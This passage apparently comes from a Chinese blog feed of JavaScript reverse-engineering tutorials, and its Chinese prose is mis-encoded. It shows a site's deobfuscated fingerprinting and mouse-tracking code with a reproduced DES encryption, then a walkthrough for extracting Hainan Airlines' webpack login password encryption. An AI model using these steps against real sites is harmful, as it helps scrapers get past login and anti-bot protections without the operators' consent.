<span class="attr">murmurhash3_32_gc</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r, n, i, o, a, s, c, l;</span><br><span class="line">        <span class="keyword">for</span> (r = <span class="number">3</span> &amp; e.<span class="property">length</span>,</span><br><span class="line">        n = e.<span class="property">length</span> - r,</span><br><span class="line">        i = t,</span><br><span class="line">        a = <span class="number">3432918353</span>,</span><br><span class="line">        s = <span class="number">461845907</span>,</span><br><span class="line">        l = <span class="number">0</span>; n &gt; l; )</span><br><span class="line">            c = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l) | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">8</span> | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">16</span> | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">24</span>,</span><br><span class="line">            ++l,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * a + (((c &gt;&gt;&gt; <span class="number">16</span>) * a &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            c = c &lt;&lt; <span class="number">15</span> | c &gt;&gt;&gt; <span class="number">17</span>,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * s + (((c &gt;&gt;&gt; <span class="number">16</span>) * s &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i ^= c,</span><br><span class="line">            i = i &lt;&lt; <span class="number">13</span> | i &gt;&gt;&gt; <span class="number">19</span>,</span><br><span class="line">            o = <span class="number">5</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">5</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i = (<span class="number">65535</span> &amp; o) + <span class="number">27492</span> + (((o &gt;&gt;&gt; <span class="number">16</span>) + <span class="number">58964</span> &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">switch</span> (c = <span class="number">0</span>,</span><br><span class="line">        r) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            c ^= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l + <span class="number">2</span>)) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            c ^= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l + <span class="number">1</span>)) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            c ^= <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l),</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * a + (((c &gt;&gt;&gt; <span class="number">16</span>) * a &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            c = c &lt;&lt; <span class="number">15</span> | c &gt;&gt;&gt; <span class="number">17</span>,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * s + (((c &gt;&gt;&gt; <span class="number">16</span>) * s &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i ^= c</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i ^= e.<span class="property">length</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        i = <span class="number">2246822507</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">2246822507</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">13</span>,</span><br><span class="line">        i = <span class="number">3266489909</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">3266489909</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        i &gt;&gt;&gt; <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hasLocalStorage</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> !!<span class="variable language_">window</span>.<span class="property">localStorage</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hasSessionStorage</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> !!<span class="variable language_">window</span>.<span class="property">sessionStorage</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">isCanvasSupported</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> !(!e.<span class="property">getContext</span> || !e.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">isIE</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Microsoft Internet Explorer&quot;</span> === navigator.<span class="property">appName</span> ? !<span class="number">0</span> : !(<span class="string">&quot;Netscape&quot;</span> !== navigator.<span class="property">appName</span> || !<span class="regexp">/Trident/</span>.<span class="title function_">test</span>(navigator.<span class="property">userAgent</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">isIE</span>() &amp;&amp; <span class="variable language_">this</span>.<span class="property">ie_activex</span> ? <span class="variable language_">this</span>.<span class="title function_">getIEPluginsString</span>() : <span class="variable language_">this</span>.<span class="title function_">getRegularPluginsString</span>()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getRegularPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">map</span>(navigator.<span class="property">plugins</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">map</span>(e, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> [e.<span class="property">type</span>, e.<span class="property">suffixes</span>].<span class="title function_">join</span>(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">            &#125;).<span class="title function_">join</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> [e.<span class="property">name</span>, e.<span class="property">description</span>, t].<span class="title function_">join</span>(<span class="string">&quot;::&quot;</span>)</span><br><span class="line">        &#125;, <span class="variable language_">this</span>).<span class="title function_">join</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getIEPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = [<span class="string">&quot;ShockwaveFlash.ShockwaveFlash&quot;</span>, <span class="string">&quot;AcroPDF.PDF&quot;</span>, <span class="string">&quot;PDF.PdfCtrl&quot;</span>, <span class="string">&quot;QuickTime.QuickTime&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control.1&quot;</span>, <span class="string">&quot;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealVideo.RealVideo(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealPlayer&quot;</span>, <span class="string">&quot;SWCtl.SWCtl&quot;</span>, <span class="string">&quot;WMPlayer.OCX&quot;</span>, <span class="string">&quot;AgControl.AgControl&quot;</span>, <span class="string">&quot;Skype.Detection&quot;</span>];</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">map</span>(e, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(e),</span><br><span class="line">                    e</span><br><span class="line">                &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).<span class="title function_">join</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getScreenResolution</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [screen.<span class="property">height</span>, screen.<span class="property">width</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getCanvasFingerprint</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>)</span><br><span class="line">          , t = e.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>)</span><br><span class="line">          , r = <span class="string">&quot;http://valve.github.io&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> t.<span class="property">textBaseline</span> = <span class="string">&quot;top&quot;</span>,</span><br><span class="line">        t.<span class="property">font</span> = <span class="string">&quot;14px &#x27;Arial&#x27;&quot;</span>,</span><br><span class="line">        t.<span class="property">textBaseline</span> = <span class="string">&quot;alphabetic&quot;</span>,</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;#f60&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillRect</span>(<span class="number">125</span>, <span class="number">1</span>, <span class="number">62</span>, <span class="number">20</span>),</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;#069&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillText</span>(r, <span class="number">2</span>, <span class="number">15</span>),</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(102, 204, 0, 0.7)&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillText</span>(r, <span class="number">4</span>, <span class="number">17</span>),</span><br><span class="line">        e.<span class="title function_">toDataURL</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yexsuom_xee\\&quot;</span>, <span class="number">7</span>, <span class="number">2</span>)] = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> e &amp;&amp; (<span class="variable language_">this</span>.<span class="title function_">push</span>(e),</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">length</span> &gt; <span class="number">5</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">shift</span>())</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;obj&quot;</span></span><br><span class="line">  , m = <span class="string">&quot;000215455&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress,</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = keydown,</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">mcArrs</span> = [],</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">mcArrps</span> = [];</span><br><span class="line"><span class="keyword">var</span> fingerprint = (<span class="keyword">new</span> referFingerprint).<span class="title function_">get</span>();</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKroleD&quot;</span>, <span class="number">3</span>, <span class="number">3</span>)] = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    mcArrs.<span class="title function_">ex_mouse</span>(e);</span><br><span class="line">    <span class="keyword">var</span> t = &#123;</span><br><span class="line">        <span class="attr">xy</span>: mcArrs,</span><br><span class="line">        <span class="attr">fingerprint</span>: fingerprint</span><br><span class="line">    &#125;</span><br><span class="line">      , r = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t)</span><br><span class="line">      , n = <span class="title function_">eq_u</span>(r, <span class="title function_">zznu</span>(zre));</span><br><span class="line">    <span class="variable language_">window</span>[coyp](<span class="title function_">_hqjl</span>(<span class="string">&quot;ycrtrehpixext\\&quot;</span>, <span class="number">7</span>, <span class="number">2</span>) + <span class="string">&quot;=&#x27;&quot;</span> + n + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">var</span> mc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    jQuery &amp;&amp; jQuery.<span class="property">mouseCollection</span>.<span class="title function_">record</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e.<span class="property">currentPoint</span>);</span><br><span class="line">        <span class="title function_">zlo</span>(t)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">  , c = <span class="string">&quot;test&quot;</span></span><br><span class="line">  , _maq = _maq || [];</span><br><span class="line">_maq.<span class="title function_">push</span>([<span class="string">&quot;_setAccount&quot;</span>, <span class="string">&quot;AIRJDWEBBJ&quot;</span>]),</span><br><span class="line">_maq.<span class="title function_">push</span>([<span class="string">&quot;_setHnaUserId&quot;</span>, <span class="string">&quot;&quot;</span>]),</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yzxolx\\&quot;</span>, <span class="number">3</span>, <span class="number">2</span>)]()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e = <span class="string">&#x27;&#123;&quot;xy&quot;:[],&quot;fingerprint&quot;:2883398340&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> t = <span class="string">&#x27;52D2841A3485DFFBCF2EA6A0515077CD&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">eq_u</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = coypJsDk.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(t)</span><br><span class="line">      , n = coypJsDk.<span class="property">DES</span>.<span class="title function_">encrypt</span>(e, r, &#123;</span><br><span class="line">        <span class="attr">mode</span>: coypJsDk.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: coypJsDk.<span class="property">pad</span>.<span class="property">Nopk</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">del_html_tags</span>(n.<span class="title function_">toString</span>(), <span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%2B&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">eq_u</span>(e, t))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSé€†å‘ </tag>
            
            <tag> è¡¥ç¯å¢ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ·å—èˆªç©ºç™»å½•é€†å‘webpack</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BA%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91webpack/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BA%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91webpack/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€ã€é€†å‘ç›®æ ‡"><a href="#ä¸€ã€é€†å‘ç›®æ ‡" class="headerlink" title="ä¸€ã€é€†å‘ç›®æ ‡"></a>ä¸€ã€é€†å‘ç›®æ ‡</h1><ul><li>ç›®æ ‡ï¼šæµ·å—èˆªç©ºç™»å½•é€†å‘webpack</li><li>é“¾æ¥ï¼š<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>ç®€ä»‹ï¼šé€†å‘ç™»å½•å¯†ç passwordï¼ˆwebpackåŠ å¯†ï¼‰</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101615362.png" alt="image.png"> </p><h1 id="äºŒã€é€†å‘å‚æ•°"><a href="#äºŒã€é€†å‘å‚æ•°" class="headerlink" title="äºŒã€é€†å‘å‚æ•°"></a>äºŒã€é€†å‘å‚æ•°</h1><h2 id="1ã€å®šä½åŠ å¯†ä½ç½®"><a href="#1ã€å®šä½åŠ å¯†ä½ç½®" class="headerlink" title="1ã€å®šä½åŠ å¯†ä½ç½®"></a>1ã€å®šä½åŠ å¯†ä½ç½®</h2><p>æ‰“XHRæ–­ç‚¹ï¼Œå‘ä¸Šè·Ÿæ ˆï¼Œæ‰¾åˆ°pinå¯†ç å­—æ®µåŠ å¯†å¤„ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101618868.png" alt="image.png"> </p><p>ä¹Ÿå¯ä»¥å…¨å±€æœç´¢å…³é”®å­— â€œpinâ€ å®šä½åˆ°å‡½æ•°æ‰€åœ¨çš„ä½ç½®</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101619915.png" alt="image.png"> </p><h2 id="2ã€é€†å‘åŠ å¯†å‡½æ•°encryptedString"><a href="#2ã€é€†å‘åŠ å¯†å‡½æ•°encryptedString" class="headerlink" title="2ã€é€†å‘åŠ å¯†å‡½æ•°encryptedString"></a>2ã€é€†å‘åŠ å¯†å‡½æ•°encryptedString</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pin: i.default.encryptedString(t)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encryptedString: function(e) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    var t = e;</span><br><span class="line">                    (new Date).getTime();</span><br><span class="line">                    return t = window.isNative ? _.default.encryptedString(e) : m.default.encryptedString(e),</span><br><span class="line">                    (new Date).getTime(),</span><br><span class="line">                    t</span><br><span class="line">                &#125; catch (t) &#123;</span><br><span class="line">                    return e</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å‘ä¸Šç¿»ï¼Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°æ˜¯webpackï¼ï¼ï¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101619161.png" alt="image.png"> </p><h2 id="3ã€webpackæ‰£å–ä»£ç "><a href="#3ã€webpackæ‰£å–ä»£ç " class="headerlink" title="3ã€webpackæ‰£å–ä»£ç "></a>3ã€webpackæ‰£å–ä»£ç </h2><h3 id="1ï¼‰æ‰¾åˆ°webpackå¯åŠ¨å™¨"><a href="#1ï¼‰æ‰¾åˆ°webpackå¯åŠ¨å™¨" class="headerlink" title="1ï¼‰æ‰¾åˆ°webpackå¯åŠ¨å™¨"></a>1ï¼‰æ‰¾åˆ°webpackå¯åŠ¨å™¨</h3><p>é¦–å…ˆï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„åŠ å¯†ä»£ç ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return t = window.isNative ? _.default.encryptedString(e) : m.default.encryptedString(e),</span><br></pre></td></tr></table></figure><p>è¿™å—æ˜¯ä¸€ä¸ªä¸‰ç›®è¡¨è¾¾å¼ï¼Œå¯ä»¥å°±çœ‹åˆ°çœŸæ­£åŠ å¯†å‡½æ•°ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m.default.encryptedString(e)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101620298.png" alt="image.png"> </p><p>è¿™å—çš„å¯¹è±¡æ˜¯ â€œmâ€ ï¼Œå‘ä¸ŠæŸ¥æ‰¾ï¼ŒæˆåŠŸå®šä½åˆ°å®šä¹‰ â€œmâ€ çš„ä½ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = E(n(87377))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101621743.png" alt="image.png"> </p><p>åˆšå¥½æ‰ä¸‹æ˜¯å®šä¹‰äº†å‡½æ•° E çš„ä½ç½®ï¼Œæ‰€ä»¥ï¼Œè¿™å—çš„åŠ è½½å™¨ï¼Œè‚¯å®šè¿˜æ˜¯ nï¼Œæ‰€ä»¥åœ¨è¿™å—æ‰“æ–­ç‚¹ï¼Œåˆ·æ–°é¡µé¢ï¼š</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101621520.png" alt="image.png"></p><p>æ–­ç‚¹ï¼Œæ–­ä¸‹åï¼Œæ‰¾åˆ°äº†å¯åŠ¨å™¨çš„ä½ç½®ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101622270.png" alt="image.png"> </p><p>ç®€å•æ”¹å†™ä¸€ä¸‹å¯åŠ¨å™¨ï¼Œæ”¹å†™åä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//æ¨¡å—</span></span><br><span class="line">  <span class="number">1</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)&#125;,</span><br><span class="line">  <span class="number">2</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101622158.png" alt="image.png"> </p><h3 id="2ï¼‰å¯¼è¿›åŠ å¯†æ¨¡å—"><a href="#2ï¼‰å¯¼è¿›åŠ å¯†æ¨¡å—" class="headerlink" title="2ï¼‰å¯¼è¿›åŠ å¯†æ¨¡å—"></a>2ï¼‰å¯¼è¿›åŠ å¯†æ¨¡å—</h3><p>æ ¹æ®å‰é¢åˆ†æï¼Œå¾—åˆ°è¿™å—æœ€å…ˆå¯¼è¿›çš„æ˜¯ â€œ87377â€ æ¨¡å—ã€‚å¯ä»¥æŒ‰ç…§é¡ºåºå…ˆè¿›è¡Œå¯¼å…¥ï¼š</p><p>åŠ å¯†å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m.default.encryptedString(e)</span><br></pre></td></tr></table></figure><p>å®šä¹‰mï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = E(n(87377))</span><br></pre></td></tr></table></figure><p>å¯¼å…¥åï¼Œå‘ç°å…¶å®ä¹Ÿåªéœ€è¦è¿™ä¸€ä¸ªæ¨¡å—å°±å¤Ÿäº†ï¼ï¼ï¼</p><h3 id="3ï¼‰è‡ªå®šä¹‰åŠ å¯†å‡½æ•°"><a href="#3ï¼‰è‡ªå®šä¹‰åŠ å¯†å‡½æ•°" class="headerlink" title="3ï¼‰è‡ªå®šä¹‰åŠ å¯†å‡½æ•°"></a>3ï¼‰è‡ªå®šä¹‰åŠ å¯†å‡½æ•°</h3><p>å…¶å®è¿™å—ä¹Ÿä¸ç”¨ç‰¹æ„å†™ï¼Œå°±æŒ‰ç…§åŸæœ¬ä»£ç ä¸­çš„åŠ å¯†ï¼Œç¨å¾®æ”¹å†™ä¸€ä¸‹å°±è¡Œï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;87377&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encryptedString</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = e;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">return</span> t = p.<span class="property">default</span>.<span class="title function_">encryptedString</span>(e),</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>(),</span><br><span class="line">      t</span><br><span class="line">  &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">  &#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4ã€æµ‹è¯•"><a href="#4ã€æµ‹è¯•" class="headerlink" title="4ã€æµ‹è¯•"></a>4ã€æµ‹è¯•</h2><p>ä»£ç å†™å¥½åï¼Œè¿è¡Œï¼ŒæˆåŠŸåŠ å¯†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101632739.png" alt="image.png"> </p><h1 id="ä¸‰ã€å®Œæ•´ä»£ç "><a href="#ä¸‰ã€å®Œæ•´ä»£ç " class="headerlink" title="ä¸‰ã€å®Œæ•´ä»£ç "></a>ä¸‰ã€å®Œæ•´ä»£ç </h1><p>å‡ ç™¾è¡Œå°±æå®šäº†ï¼Œæœ¬èº«è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,e)</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//æ¨¡å—</span></span><br><span class="line">  <span class="number">87377</span>: <span 